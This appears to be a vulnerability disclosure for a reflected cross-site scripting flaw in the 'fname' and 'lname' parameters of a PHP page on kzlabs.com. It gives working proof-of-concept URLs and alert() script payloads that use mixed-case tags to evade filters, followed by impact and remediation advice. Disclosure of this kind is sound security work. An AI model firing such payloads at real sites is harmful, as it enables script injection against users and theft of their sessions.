# Reflected Cross-Site Scripting (XSS) via `fname` and `lname` Parameters

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `fname` and `lname` parameters of the application. User-supplied input is reflected into the response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="gx4k2n"
http://kzlabs.com/2.php?fname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS1%22%29%3C%2FsCript%3E&lname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS2%22%29%3C%2FsCript%3E
```

---

## Vulnerable Parameters

```text id="q1zv8m"
fname
lname
```

---

## Payloads Used

```html id="p6m2jk"
"xicorr><sCript>alert("xicorXSS1")</sCript>
```

```html id="l9c5ws"
"xicorr><sCript>alert("xicorXSS2")</sCript>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/2.php?fname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS1%22%29%3C%2FsCript%3E&lname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS2%22%29%3C%2FsCript%3E
   ```

2. Observe that the payloads are reflected into the response.

3. JavaScript executes automatically and triggers popup dialogs.

---

## Proof of Concept

```text id="n8d1ya"
http://kzlabs.com/2.php?fname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS1%22%29%3C%2FsCript%3E&lname=%22xicorr%3E%3CsCript%3Ealert%28%22xicorXSS2%22%29%3C%2FsCript%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/97a4969e-23f8-4010-9462-018577480164" />


<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/13237b84-ab4c-452d-9f0a-7a75196b03cf" />


---

## Impact

* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft

---

## Recommendations for Fix

* Encode output before rendering
* Validate and sanitize user input
* Implement context-aware escaping
